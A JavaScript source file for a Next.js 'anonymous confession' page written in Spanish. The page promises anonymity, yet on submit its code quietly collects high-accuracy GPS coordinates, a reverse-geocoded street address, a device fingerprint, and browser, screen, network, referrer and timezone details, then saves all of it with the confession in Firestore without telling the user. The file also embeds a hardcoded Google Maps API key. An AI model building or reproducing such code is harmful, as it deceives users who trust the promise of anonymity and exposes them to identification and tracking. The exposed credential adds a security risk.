// app/confession/page.js
"use client";
import { useState } from "react";
import axios from "axios";
import { db } from "../../firebase";
import { collection, addDoc } from "firebase/firestore";
import DeviceDetector from "device-detector-js";

export default function ConfessionPage() {
  const [confession, setConfession] = useState("");
  const [message, setMessage] = useState("");

  const handleConfessionSubmit = async () => {
    if (!confession) {
      setMessage("La confesión no puede estar vacía.");
      return;
    }

    try {
      const deviceDetector = new DeviceDetector();
      const userAgent = navigator.userAgent;
      const device = deviceDetector.parse(userAgent);

      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });

      const { latitude, longitude, accuracy } = position.coords;
      const timestamp = new Date();

      // Obtener la dirección mediante la API de Google Maps
      const apiKey = "AIzaSyDv5rNjL10dfS74oVAKpmjrhjI9MWmMvOQ";
      const response = await axios.get(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=${apiKey}&result_type=street_address`);

      let address = "Dirección no disponible";
      let detailedAddress = {};

      if (response.data.results.length > 0) {
        address = response.data.results[0].formatted_address;
        
        // Extraer componentes detallados de la dirección
        const addressComponents = response.data.results[0].address_components;
        for (let component of addressComponents) {
          if (component.types.includes("street_number")) {
            detailedAddress.streetNumber = component.long_name;
          }
          if (component.types.includes("route")) {
            detailedAddress.street = component.long_name;
          }
          if (component.types.includes("locality")) {
            detailedAddress.city = component.long_name;
          }
          if (component.types.includes("administrative_area_level_1")) {
            detailedAddress.state = component.long_name;
          }
          if (component.types.includes("country")) {
            detailedAddress.country = component.long_name;
          }
          if (component.types.includes("postal_code")) {
            detailedAddress.postalCode = component.long_name;
          }
        }
      }

      const browserInfo = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
      };

      const screenInfo = {
        width: window.screen.width,
        height: window.screen.height,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
      };

      const networkInfo = {
        onLine: navigator.onLine,
        connectionType: 'unknown',
        effectiveType: 'unknown',
        downlinkMax: 'unknown',
        saveData: 'unknown'
      };

      if (navigator.connection) {
        networkInfo.connectionType = navigator.connection.type;
        networkInfo.effectiveType = navigator.connection.effectiveType;
        networkInfo.downlinkMax = navigator.connection.downlinkMax;
        networkInfo.saveData = navigator.connection.saveData;
      }

      const pageInfo = {
        url: window.location.href,
        referrer: document.referrer,
        loadTime: performance.now(),
      };

      await addDoc(collection(db, "confessions"), {
        confession,
        latitude,
        longitude,
        accuracy,
        address,
        detailedAddress,
        timestamp: timestamp.toLocaleString("es-ES", {
          day: "2-digit",
          month: "2-digit",
          year: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
        }),
        device,
        browserInfo,
        screenInfo,
        networkInfo,
        pageInfo,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      });

      setConfession("");
      setMessage("La confesión se guardó exitosamente.");
    } catch (error) {
      console.error("Error al guardar la confesión: ", error);
      if (error.code === 1) {
        setMessage("Permiso denegado para obtener la ubicación.");
      } else if (error.code === 2) {
        setMessage("La información de la ubicación no está disponible.");
      } else if (error.code === 3) {
        setMessage("El tiempo de espera para obtener la ubicación ha expirado.");
      } else {
        setMessage("Ocurrió un error al guardar la confesión.");
      }
    }
  };

  return (
    <div>
      <h1>Haz una confesión anónima</h1>
      <textarea
        value={confession}
        onChange={(e) => setConfession(e.target.value)}
        placeholder="Escribe tu confesión aquí..."
      />
      <button onClick={handleConfessionSubmit}>Enviar</button>
      {message && <p>{message}</p>}
    </div>
  );
}